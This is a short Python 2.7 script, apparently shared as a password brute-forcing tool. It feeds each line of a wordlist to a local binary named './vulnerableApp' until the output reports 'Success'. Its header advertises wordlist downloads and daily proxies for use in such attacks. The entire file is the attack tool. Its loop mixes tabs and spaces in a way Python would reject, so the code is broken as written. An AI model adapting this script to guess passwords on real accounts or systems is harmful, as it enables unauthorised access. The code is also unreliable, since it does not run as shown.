#!/usr/bin/python
#Python Version : 2.7
#     __                                           _             __   _    
#    / /_  __  __   ______________ _____  __  __  (_)_  ______  / /__(_)__ 
#   / __ \/ / / /  / ___/ ___/ __ `/_  / / / / / / / / / / __ \/ //_/ / _ \
#  / /_/ / /_/ /  / /__/ /  / /_/ / / /_/ /_/ / / / /_/ / / / / ,< / /  __/
# /_.___/\__, /   \___/_/   \__,_/ /___/\__, /_/ /\__,_/_/ /_/_/|_/_/\___/ 
#       /____/                         /____/___/                          
#
###############################################################################
# Download huge collections of wordlist:#
#http://ul.to/folder/j7gmyz#
##########################################################################
#
####################################################################
# Need daylie updated proxies?#
#http://j.mp/Y7ZZq9#
################################################################
#
######################################################
#### Basic Password Bruteforcing Tool ######
###################################################
#
import subprocess
import re

fo = open("password.txt", 'r');
for lines in fo:
  password = lines.split('\n')
	brute = subprocess.Popen(["./vulnerableApp", "-f", "foo.txt", "-p", password[0]], stdout=subprocess.PIPE)
	if(re.search("Success", brute.communicate()[0])):
		print "Password Cracked and your Password is ", password[0]
		exit()
	else:
		print password[0], " is not Password"
